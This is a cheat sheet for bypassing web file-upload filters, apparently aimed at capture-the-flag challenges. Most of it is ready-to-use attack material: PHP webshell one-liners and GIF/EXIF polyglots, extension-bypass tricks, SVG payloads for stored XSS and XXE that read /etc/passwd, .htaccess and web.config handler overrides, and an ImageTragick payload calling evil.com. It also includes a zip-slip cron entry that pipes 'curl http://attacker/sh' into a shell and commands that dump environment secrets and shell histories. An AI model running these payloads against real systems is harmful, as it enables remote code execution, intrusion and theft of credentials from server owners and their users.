# File Upload Bypass

Upload a file the server didn't expect. If parsed → RCE. If served → stored XSS / SSRF / open redirect / phishing.

## First look

For every upload form, record:
```
Field name:                        file / upload / avatar / ...
Content-Type header the server sets:
Reflected URL (where it stores):
Server tech stack:                 PHP / Node / Python / Java / etc.
Rename behavior:                   keeps name? UUIDs? strips extension?
Max size:
Processing:                        thumbnail generator? parser? AV scanner?
```

## Extension bypass tactics

| Server behavior | Trick |
| --- | --- |
| Blacklists `.php` | `.phtml`, `.php3`, `.php4`, `.php5`, `.phar`, `.pht`, `.phps`, `.pHp`, `.PhP5` |
| Blacklists `.asp` | `.aspx`, `.asa`, `.cer`, `.cdx`, `.hta` |
| Blacklists `.jsp` | `.jspx`, `.jsw`, `.jsv`, `.jspf` |
| Checks only MIME header | upload `.php` with `Content-Type: image/png` |
| Checks file content for magic bytes | prepend `GIF89a;<?php system($_GET["c"]);?>` |
| Appends extension to end | `shell.php%00.jpg` (null byte), `shell.php;.jpg`, `shell.php:.jpg` |
| Uses `fnmatch` with `.jpg` | `shell.jpg.php`, `shell.php.jpg` |
| Checks first extension only | `shell.jpg.php` (Apache mod_mime), `shell.php.unknown` → Apache falls back to the last recognised |
| Strips `.php` once | `shell.phphp` → stripped to `shell.p` + `hp` = `.php` |
| Uses `pathinfo()` on untrusted input | `shell.php/x.jpg` (nginx) |
| IIS 6.0 legacy | `shell.asp;.jpg`, `shell.asp/.jpg` |

## Content-based filters

Make the file BE a valid image AND executable:

### PHP polyglot (GIF+PHP)
```bash
printf 'GIF89a;\n<?php system($_GET["c"]); ?>\n' > shell.php.gif
```
Upload as `.gif`, access via `?c=id`.

### Real image + appended code
```bash
cp real.jpg shell.jpg.php
printf '<?php system($_GET["c"]); ?>' >> shell.jpg.php
# ImageMagick/Pillow re-encoders will strip trailing bytes — bypass by using EXIF comment:
exiftool -Comment='<?php system($_GET["c"]); ?>' real.jpg
mv real.jpg shell.php.jpg
```

### SVG for stored XSS
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
 "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```
Serves as `image/svg+xml` → script runs in browser context.

### SVG for XXE (if parsed server-side)
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

## Content-Type MIME tricks

```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png                   <-- lie about type
```

Multiple files in one request (some parsers only check the last):
```
filename="legit.png"  Content-Type: image/png
filename="shell.php"  Content-Type: application/x-php
```

## .htaccess upload (Apache)

If `.htaccess` upload isn't blocked:
```apache
# .htaccess
AddType application/x-httpd-php .jpg
```
Then upload `shell.jpg` with PHP code — Apache will execute it.

## web.config upload (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified"/>
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config"/>
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

## Archive/ZIP tricks

### Zip slip (path traversal in zip extraction)
```bash
# Create a zip whose entries include "../../../../etc/cron.d/pwn"
mkdir slip && cd slip && printf '* * * * * root curl http://attacker/sh | sh\n' > pwn
zip -r ../slip.zip ../../../../etc/cron.d/pwn pwn
# Many libraries don't sanitize path components during extraction
```

### Zip bomb (DoS; rarely useful in CTF)
```bash
# 42.zip-style; use `genzipbomb` or hand-craft. Lab only.
```

## Image parser RCE (ImageTragick etc.)

If server runs ImageMagick < 6.9.3-10 on the upload, old `coder=https` or `coder=ephemeral` → RCE:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://evil.com/image.jpg";|id ")'
pop graphic-context
```
Save as `exploit.mvg` or `exploit.svg`.

## Server-side request smuggling via upload

Upload an SVG/XML/CSV that references `http://169.254.169.254/` → thumbnail generator or import worker fetches cloud metadata.

## Hunting flags once you have RCE

```bash
# Via your uploaded webshell:
?c=id
?c=ls -la /
?c=cat /flag* /root/*.txt /home/*/.bash_history 2>/dev/null
?c=find / -iname 'flag*' 2>/dev/null -ls
?c=env
?c=cat /proc/self/environ | tr '\0' '\n'
```

## Offline reference

```bash
ls /opt/tools/PayloadsAllTheThings/Upload\ Insecure\ Files/
rg -n 'file upload|htaccess|web.config' /opt/tools/HackTricks/
```

## Tips
- Upload paths that LOOK like static assets often get served without going through the app handler — great for stored XSS via SVG.
- The challenge might rename your upload — look for the final URL in the response body OR dirsearch the upload folder (`/uploads/`, `/files/`, `/media/`).
- Server-side image resizing kills many polyglots. Hiding the PHP in an EXIF comment survives most resizers.
- If `.php` is universally blocked, try `.phar` — PHP will execute it when accessed if `allow_url_include` or if the handler is set up to invoke phar.
- The quickest test: upload a one-pixel GIF with your payload, access the stored URL. If you see your payload in the response → done.
